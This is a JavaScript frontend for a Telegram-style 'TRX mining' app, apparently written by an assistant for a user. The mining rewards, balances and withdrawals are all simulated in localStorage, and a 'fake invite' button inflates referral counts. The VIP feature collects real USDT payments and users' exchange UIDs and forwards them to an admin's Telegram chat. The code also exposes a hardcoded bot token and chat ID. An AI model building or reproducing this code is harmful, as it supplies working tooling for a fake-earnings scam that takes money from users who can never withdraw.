// ---------------- CONFIG ----------------
// Replace these if needed (I set them from your last message)
const TELEGRAM_BOT_TOKEN = "8360712858:AAEB13jcCnyhm1UnHsj5fbc2w_2pBPL6L1s";
const ADMIN_CHAT_ID = "5550926280";

// App constants
const COIN_NAME = "TRX";
const COIN_RATE = 0.002; // 1 TRX = 0.002 USDT (example)
const MINING_DURATION_MS = 2 * 60 * 60 * 1000; // 2 hours
const CLAIM_AMOUNT = 5; // reward
const VIP_COST_USDT = 0.10; // VIP price
// ----------------------------------------

/*---- state helpers ----*/
function getState(key, def){ try{ const v=localStorage.getItem(key); return v?JSON.parse(v):def; } catch(e){return def;} }
function setState(key,val){ localStorage.setItem(key, JSON.stringify(val)); }

/*---- initial state ----*/
let state = {
  trx: getState('trx', 0.00),
  usdt: getState('usdt', 0.02), // demo free USDT shown
  teamCount: getState('teamCount', 0),
  miningActive: getState('miningActive', false),
  miningEnd: getState('miningEnd', null),
  vipActive: getState('vipActive', false)
};

/*---- DOM ----*/
const pages = Array.from(document.querySelectorAll('.page'));
const navBtns = Array.from(document.querySelectorAll('.nav-btn'));
const wlfiAmountEl = document.getElementById('wlfiAmount');
const meWLFI = document.getElementById('meWLFI');
const meUSDT = document.getElementById('meUSDT');
const progressInner = document.getElementById('progressInner');
const progressTimer = document.getElementById('progressTimer');
const mineActionBtn = document.getElementById('mineActionBtn');
const claimBtn = document.getElementById('claimBtn');
const mineStatus = document.getElementById('mineStatus');

const refLink = document.getElementById('refLink');
const copyRefBtn = document.getElementById('copyRefBtn');
const fakeInviteBtn = document.getElementById('fakeInviteBtn');
const teamCountEl = document.getElementById('teamCount');

const convertInput = document.getElementById('convertInput');
const convertDo = document.getElementById('convertDo');
const convertResult = document.getElementById('convertResult');

const withdrawMethod = document.getElementById('withdrawMethod');
const withdrawUID = document.getElementById('withdrawUID');
const withdrawAmount = document.getElementById('withdrawAmount');
const submitWithdraw = document.getElementById('submitWithdraw');
const withdrawMsg = document.getElementById('withdrawMsg');

const vipExchange = document.getElementById('vipExchange');
const vipSenderUid = document.getElementById('vipSenderUid');
const vipMemo = document.getElementById('vipMemo');
const vipProof = document.getElementById('vipProof');
const vipSubmit = document.getElementById('vipSubmit');
const vipMsg = document.getElementById('vipMsg');

/* nav */
navBtns.forEach(btn=>{
  btn.addEventListener('click', ()=>{
    navBtns.forEach(b=>b.classList.remove('active'));
    btn.classList.add('active');
    pages.forEach(p=>p.classList.remove('active'));
    document.getElementById(btn.dataset.target).classList.add('active');
  })
});

/* render */
function renderAll(){
  wlfiAmountEl.innerText = parseFloat(state.trx).toFixed(2);
  meWLFI.innerText = parseFloat(state.trx).toFixed(2);
  meUSDT.innerText = parseFloat(state.usdt).toFixed(2);
  teamCountEl.innerText = state.teamCount;
  refLink.value = `https://t.me/YourBot?start=ref_${Math.floor(Math.random()*100000)}`;
  updateMiningUI();
  setState('trx', state.trx);
  setState('usdt', state.usdt);
  setState('teamCount', state.teamCount);
  setState('vipActive', state.vipActive);
  setState('miningActive', state.miningActive);
  setState('miningEnd', state.miningEnd);
}

/* Mining */
let timerInterval = null;
function updateMiningUI(){
  if(state.miningActive && state.miningEnd){
    const remaining = state.miningEnd - Date.now();
    if(remaining <= 0){
      progressInner.style.width = '100%';
      progressTimer.innerText = 'Ready to claim';
      mineStatus.innerText = 'Completed';
      mineActionBtn.classList.add('hidden');
      claimBtn.classList.remove('hidden');
      if(timerInterval){ clearInterval(timerInterval); timerInterval=null; }
    } else {
      const pct = ((MINING_DURATION_MS - remaining)/MINING_DURATION_MS)*100;
      progressInner.style.width = pct + '%';
      const hrs = Math.floor(remaining / (1000*60*60));
      const mins = Math.floor((remaining % (1000*60*60)) / (1000*60));
      const secs = Math.floor((remaining % (1000*60)) / 1000);
      progressTimer.innerText = `Time left: ${hrs}h ${mins}m ${secs}s`;
      mineStatus.innerText = 'Mining';
      mineActionBtn.classList.add('hidden');
      claimBtn.classList.add('hidden');
      if(!timerInterval){
        timerInterval = setInterval(updateMiningUI, 1000);
      }
    }
  } else {
    progressInner.style.width = '0%';
    progressTimer.innerText = 'Not started';
    mineStatus.innerText = 'Not started';
    mineActionBtn.classList.remove('hidden');
    claimBtn.classList.add('hidden');
    if(timerInterval){ clearInterval(timerInterval); timerInterval=null; }
  }
}

/* start mining */
function startMining(){
  if(state.miningActive) return alert('Already mining.');
  state.miningActive = true;
  state.miningEnd = Date.now() + MINING_DURATION_MS;
  sendTelegramMessage(`<b>Mining started</b>\nUser: Guest\nEnds: ${new Date(state.miningEnd).toLocaleString()}`);
  renderAll();
}

/* collect */
function collectReward(){
  let reward = CLAIM_AMOUNT;
  if(state.vipActive) reward = reward * 50;
  state.trx = parseFloat(state.trx) + reward;
  state.miningActive = false;
  state.miningEnd = null;
  sendTelegramMessage(`<b>Claim</b>\nUser: Guest\nReward: ${reward} ${COIN_NAME}`);
  renderAll();
}

/* Convert */
function doConvert(){
  const v = parseFloat(convertInput.value || 0);
  if(!v || v<=0) return alert('Enter amount');
  if(v > state.trx) return alert('Not enough TRX');
  const converted = v * COIN_RATE;
  state.trx = parseFloat(state.trx) - v;
  state.usdt = parseFloat(state.usdt) + converted;
  convertResult.innerText = `Converted ${v} ${COIN_NAME} → ${converted.toFixed(4)} USDT`;
  sendTelegramMessage(`<b>Convert</b>\nUser: Guest\n${v} ${COIN_NAME} → ${converted.toFixed(4)} USDT`);
  renderAll();
}

/* Withdraw */
function doWithdraw(){
  const uid = withdrawUID.value.trim();
  const amount = parseFloat(withdrawAmount.value || 0);
  if(!uid) return alert('Enter UID');
  if(!amount || amount <= 0) return alert('Enter amount');
  if(amount > state.usdt) return alert('Not enough USDT');
  // simulate
  state.usdt = parseFloat(state.usdt) - amount;
  withdrawMsg.innerText = `Withdraw submitted: ${amount.toFixed(4)} USDT -> ${withdrawMethod.value} UID:${uid}`;
  sendTelegramMessage(`<b>Withdraw Request</b>\nMethod: ${withdrawMethod.value}\nUID: ${uid}\nAmount: ${amount.toFixed(4)} USDT`);
  renderAll();
}

/* VIP submit */
function doVipSubmit(){
  const ex = vipExchange.value;
  const sender = vipSenderUid.value.trim();
  const memo = vipMemo.value.trim();
  const file = vipProof.files && vipProof.files[0];
  if(!sender || !memo) return alert('Enter UID and transaction memo');
  // We can't upload image to server here (frontend-only). We'll notify admin & show message.
  vipMsg.innerText = 'Submitted for review — admin will verify.';
  sendTelegramMessage(`<b>VIP Request</b>\nExchange: ${ex}\nSender UID: ${sender}\nMemo: ${memo}\nCost: ${VIP_COST_USDT} USDT`);
}

/* Telegram send */
function sendTelegramMessage(message){
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  fetch(url, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({
      chat_id: ADMIN_CHAT_ID,
      text: message,
      parse_mode: "HTML"
    })
  }).catch(e=>console.error('tg send error',e));
}

/* referral copy */
copyRefBtn.addEventListener('click', ()=>{
  navigator.clipboard && navigator.clipboard.writeText(refLink.value);
  alert('Referral link copied (demo).');
});
fakeInviteBtn.addEventListener('click', ()=>{ state.teamCount++; setState('teamCount', state.teamCount); renderAll(); });

/* attach events */
mineActionBtn.addEventListener('click', startMining);
claimBtn.addEventListener('click', collectReward);
convertDo.addEventListener('click', doConvert);
submitWithdraw.addEventListener('click', doWithdraw);
vipSubmit.addEventListener('click', doVipSubmit);

/* init */
(function init(){
  const miningActive = getState('miningActive', false);
  const miningEnd = getState('miningEnd', null);
  if(miningActive && miningEnd){
    state.miningActive = true;
    state.miningEnd = miningEnd;
  } else {
    state.miningActive = false;
    state.miningEnd = null;
  }
  renderAll();
})();
